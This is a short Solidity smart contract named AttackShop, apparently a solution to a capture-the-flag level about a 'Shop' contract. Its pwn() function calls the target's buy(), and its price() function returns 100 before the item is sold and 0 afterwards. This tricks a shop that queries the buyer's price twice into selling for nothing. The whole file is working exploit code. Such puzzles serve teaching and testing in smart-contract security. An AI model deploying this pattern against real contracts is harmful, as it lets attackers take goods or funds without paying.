// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/shop.sol';

contract AttackShop {
    Shop target;

    constructor(address _target){
        target = Shop(_target);
        
    } 
    function pwn() public{
        target.buy();
    }
    function price() public view returns (uint){
        if (target.isSold()){
            return 0;
        }
        return 100;
    }
}